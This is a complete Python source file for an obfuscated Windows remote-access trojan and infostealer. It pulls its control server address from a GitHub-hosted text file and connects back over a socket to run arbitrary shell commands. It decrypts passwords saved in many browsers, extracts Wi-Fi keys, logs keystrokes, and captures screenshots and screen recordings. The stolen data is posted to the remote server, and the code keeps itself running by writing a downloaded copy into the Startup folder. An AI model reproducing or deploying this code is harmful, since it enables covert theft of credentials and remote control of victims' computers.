import subprocess,socket,time,requests,os,logging,imageio,json,sqlite3,win32crypt,base64,shutil
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from datetime import datetime
from Cryptodome.Cipher import AES
CBQLzjYwsNALSIwNYNFR = ""
FlSdCKTPVzXOdWGbDwlaH = ""
twtJmQia = "18.12.24.0"
phcmSjDqIqF = "!"
faVWfJopbUylb = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
cblWskwwlHZKjQQiTjnRwZv = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
OfsFJFDnsynFsnVu = os.path.expanduser("~\\AppData\\Local\\")
USER_ROAMING = os.path.expanduser("~\\AppData\\Roaming\\")
BROWSERS = {
	'chrome': OfsFJFDnsynFsnVu + 'Google\\Chrome\\User Data','chromium': OfsFJFDnsynFsnVu + 'Chromium\\User Data','chrome-canary': OfsFJFDnsynFsnVu + 'Google\\Chrome SxS\\User Data',
	'msedge': OfsFJFDnsynFsnVu + 'Microsoft\\Edge\\User Data','msedge-canary': OfsFJFDnsynFsnVu + 'Microsoft\\Edge SxS\\User Data',
	'msedge-beta': OfsFJFDnsynFsnVu + 'Microsoft\\Edge Beta\\User Data','msedge-dev': OfsFJFDnsynFsnVu + 'Microsoft\\Edge Dev\\User Data',
	'avast': OfsFJFDnsynFsnVu + 'AVAST Software\\Browser\\User Data','amigo': OfsFJFDnsynFsnVu + 'Amigo\\User Data',
	'torch': OfsFJFDnsynFsnVu + 'Torch\\User Data','kometa': OfsFJFDnsynFsnVu + 'Kometa\\User Data','orbitum': OfsFJFDnsynFsnVu + 'Orbitum\\User Data',
	'cent-browser': OfsFJFDnsynFsnVu + 'CentBrowser\\User Data','7star': OfsFJFDnsynFsnVu + '7Star\\7Star\\User Data',
	'sputnik': OfsFJFDnsynFsnVu + 'Sputnik\\Sputnik\\User Data','vivaldi': OfsFJFDnsynFsnVu + 'Vivaldi\\User Data',
	'epic-privacy-browser': OfsFJFDnsynFsnVu + 'Epic Privacy Browser\\User Data','uran': OfsFJFDnsynFsnVu + 'uCozMedia\\Uran\\User Data',
	'yandex': OfsFJFDnsynFsnVu + 'Yandex\\YandexBrowser\\User Data','brave': OfsFJFDnsynFsnVu + 'BraveSoftware\\Brave-Browser\\User Data',
	'iridium': OfsFJFDnsynFsnVu + 'Iridium\\User Data','coccoc': OfsFJFDnsynFsnVu + 'CocCoc\\Browser\\User Data',
	'opera': USER_ROAMING + 'Opera Software\\Opera Stable','opera-gx': USER_ROAMING + 'Opera Software\\Opera GX Stable'
}
def PmUgaYbQwKUJLwznfaq(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def YcNMgiJvTCQCZEQiUEeDj(s):
	data = s.recv(1024)
	if len(data)==0:
		return True
	cYujqDJxvDYkhYgkFFfSVEO = data.decode("utf-8").replace("\n","")
	if not cYujqDJxvDYkhYgkFFfSVEO.startswith(phcmSjDqIqF):
		proc = subprocess.run(cYujqDJxvDYkhYgkFFfSVEO, shell=True, capture_output=True)
		zeqgyrJWJSeulxF = proc.stdout + proc.stderr
		s.send(zeqgyrJWJSeulxF)
		return
	NarJnUN = cYujqDJxvDYkhYgkFFfSVEO.split(" ")[0][1:]
	args = " ".join(cYujqDJxvDYkhYgkFFfSVEO.split()[1:]).split()
	if NarJnUN == "download":
		QDuWKXflydfWNbAarQnP(s, cYujqDJxvDYkhYgkFFfSVEO)
	elif NarJnUN == "screenshot":
		fMxzWgzyn(s)
	elif NarJnUN == "basename":
		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
	elif NarJnUN == "update":
		FUqUuNDQeRJK(s)
	elif NarJnUN == "wifi":
		KoLkOvdkZdPGAZgPxHgxZGM(s)
	elif NarJnUN == "screenrecord":
		orJVgeCearPteLqHRZuVPK(s, args)
	elif NarJnUN == "browsers":
		scrapeBrowsers(s)
def QDuWKXflydfWNbAarQnP(s, cYujqDJxvDYkhYgkFFfSVEO):
	ROJopoZzgVIQUMEmQROz = cYujqDJxvDYkhYgkFFfSVEO.replace(phcmSjDqIqF+"download ","").split(",")
	zeqgyrJWJSeulxFs = ""
	for f in ROJopoZzgVIQUMEmQROz:
		zeqgyrJWJSeulxFs += ydSvVJMQAqoGv(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(zeqgyrJWJSeulxFs, "utf-8"))
def fMxzWgzyn(s):
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	cujQJbSCNmDyfmQFSezEoQ = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(cujQJbSCNmDyfmQFSezEoQ)
	image.close()
	r = ydSvVJMQAqoGv(cujQJbSCNmDyfmQFSezEoQ, "api/sscap")
	os.remove(cujQJbSCNmDyfmQFSezEoQ)
	s.send(bytes(r,"utf-8"))
def orJVgeCearPteLqHRZuVPK(s, args):
	xGWDukrsDoyJHJMBHc = 15
	if not args == []:
		try: xGWDukrsDoyJHJMBHc = int(args[0])
		except: pass
	uxiClTRbmYakQbpSIx = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	MUuKDSwBDj = []
	fps = 11
	numFrames = xGWDukrsDoyJHJMBHc * fps
	for _ in range(numFrames):
		MUuKDSwBDj.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(uxiClTRbmYakQbpSIx, MUuKDSwBDj, fps=fps, quality=8)
	ydSvVJMQAqoGv(uxiClTRbmYakQbpSIx, "api/screc")
def ydSvVJMQAqoGv(AzLaQJJWDeSWPMFGkgjs, ApGKVnkIFqZyyatCqmSWPE, uKMFGJYqIYX=None):
	if not os.path.isfile(AzLaQJJWDeSWPMFGkgjs):
		return "[!] 404: "+AzLaQJJWDeSWPMFGkgjs+"\n"
	headers = {"user":os.getlogin()}
	if uKMFGJYqIYX is not None:
		headers = {**headers, **uKMFGJYqIYX}
	f = open(AzLaQJJWDeSWPMFGkgjs, "rb")
	requests.post("http://"+CBQLzjYwsNALSIwNYNFR+":5555/"+ApGKVnkIFqZyyatCqmSWPE,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200\n"
def uploadData(dataToSend, ApGKVnkIFqZyyatCqmSWPE):
	if dataToSend.strip() == "":
		return "[!] 204\n"
	requests.post("http://"+CBQLzjYwsNALSIwNYNFR+":5555/"+ApGKVnkIFqZyyatCqmSWPE,
		data=dataToSend,
		headers={"user":os.getlogin()})
	return "[+] 200\n"
def FUqUuNDQeRJK(s):
	h, p, v = FmJAydBYDqVAPgm(True)
	if (v != twtJmQia):
		OdwOXuWXHmMSIdFkCZUIgh(v)
		s.send(b"[+] 200\n")
	else:
		s.send(b"[-] 304\n")
def KoLkOvdkZdPGAZgPxHgxZGM(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		s.send(b"[!] 500\n")
		return
	WlyzbrEFqru = ""
	for p in profiles:
		try: WlyzbrEFqru+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()+"\n"
		except: WlyzbrEFqru+=f"    {p} - N/A\n"
	s.send(bytes(WlyzbrEFqru, "utf-8"))
def OdwOXuWXHmMSIdFkCZUIgh(fQZACWn):
	FOCBzfPIAMLCtxp = os.path.basename(__file__)
	fileType = FOCBzfPIAMLCtxp.split(".")[-1]
	yssQxTdzrnnFScm = FOCBzfPIAMLCtxp.split(".")[0]+"."+fQZACWn+".pyw" if fileType.startswith("py") else ".exe"
	lISGEPmfWwflLzB = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), yssQxTdzrnnFScm)
	if not os.path.isfile(lISGEPmfWwflLzB):
		with open(lISGEPmfWwflLzB, "w+") as f:
			f.write(requests.get(cblWskwwlHZKjQQiTjnRwZv+"file."+ "pyw" if lISGEPmfWwflLzB.split(".")[-1].startswith("py") else "exe").text)
def FmJAydBYDqVAPgm(force=False):
	global CBQLzjYwsNALSIwNYNFR, FlSdCKTPVzXOdWGbDwlaH
	if force or CBQLzjYwsNALSIwNYNFR == "" or FlSdCKTPVzXOdWGbDwlaH == "":
		data = requests.get(faVWfJopbUylb).text.replace("\n","").split(":")
		CBQLzjYwsNALSIwNYNFR = data[0].strip()
		FlSdCKTPVzXOdWGbDwlaH = data[1].strip()
		fQZACWn = data[2].strip()
	return CBQLzjYwsNALSIwNYNFR, FlSdCKTPVzXOdWGbDwlaH, fQZACWn
def ddQjatJkXazlxWqkXHELEm():
	try:
		AzfArYsbkhu = "settings.xpb"
		jamTmrpr = sorted([file for file in os.listdir(OfsFJFDnsynFsnVu) if os.path.isfile(OfsFJFDnsynFsnVu+"\\"+file) and file.endswith(AzfArYsbkhu.split(".")[-1])])
		if AzfArYsbkhu in jamTmrpr:
			jamTmrpr.remove(AzfArYsbkhu)
		lfvhUDvhLNGCCRkitol = os.path.join(OfsFJFDnsynFsnVu,AzfArYsbkhu)
		if len(jamTmrpr) > 0:
			with open(lfvhUDvhLNGCCRkitol, "ab+") as f:
				for file in jamTmrpr:
					temp = os.path.join(OfsFJFDnsynFsnVu,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		ydSvVJMQAqoGv(lfvhUDvhLNGCCRkitol, "api/log")
		if os.path.isfile(lfvhUDvhLNGCCRkitol):
			os.remove(lfvhUDvhLNGCCRkitol)
	except:
		pass
def SQhrdXhtfMpKaA():
	logging.basicConfig(filename=(OfsFJFDnsynFsnVu+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def BBOQYGaQqt(k):
		logging.info(str(k))
	k=Listener(on_press=BBOQYGaQqt)
	bbELkTHBmYAAqTGT = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in bbELkTHBmYAAqTGT:
		l.setLevel(logging.CRITICAL)
	k.start()
def scrapeBrowsers(s, upload=False):
	data = "\n"
	for browser in BROWSERS:
		path = BROWSERS[browser]
		encryptionKey = None
		if not os.path.isfile(path+"\\Local State"):
			continue
		with open(path+"\\Local State", "r") as f:
			localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
			encryptionKey = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
		shutil.copyfile(path+"\\Default\\Login Data", OfsFJFDnsynFsnVu+"\\db.db")
		conn = sqlite3.connect(OfsFJFDnsynFsnVu+"\\db.db")
		cursor = conn.cursor()
		cursor.execute("SELECT action_url, username_value, password_value FROM logins")
		data += "*"*8+" "+browser+" "+"*"*8+"\n"
		for _, login in enumerate(cursor.fetchall()):
			ciphertext = login[2]
			initVector = ciphertext[3:15]
			encryptedPwd = ciphertext[15:-16]
			cipher = AES.new(encryptionKey, AES.MODE_GCM, initVector)
			decryptedPwd = (cipher.decrypt(encryptedPwd)).decode()
			data += f"URL: {login[0]}\nUser: {login[1]}\nValue: {decryptedPwd}\n\n"
		cursor.close()
		conn.close()
	data += "\n"
	if os.path.isfile(OfsFJFDnsynFsnVu+"\\db.db"):
		os.remove(OfsFJFDnsynFsnVu+"\\db.db")
	if not upload:
		s.send(bytes(data,"utf-8"))
	else:
		uploadData(data, "api/google")
def tFzOQiHJsmwvLhAZsmABCgh():
	h, p, v = FmJAydBYDqVAPgm()
	try:
		ddQjatJkXazlxWqkXHELEm()
		scrapeBrowsers(None,True)
		if twtJmQia != v:
			OdwOXuWXHmMSIdFkCZUIgh(v)
		SQhrdXhtfMpKaA()
	except:
		pass
	MrxEsFeBUVgSrPwCQ = bytes(("(old)"if twtJmQia!=v else "")+"["+twtJmQia+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		dClBwrEYMlgYWI=False
		try:
			s=PmUgaYbQwKUJLwznfaq(h, p)
			while not dClBwrEYMlgYWI:
				s.send(MrxEsFeBUVgSrPwCQ)
				dClBwrEYMlgYWI=YcNMgiJvTCQCZEQiUEeDj(s)
			s.close()
		except:
			pass
		time.sleep(5)
tFzOQiHJsmwvLhAZsmABCgh()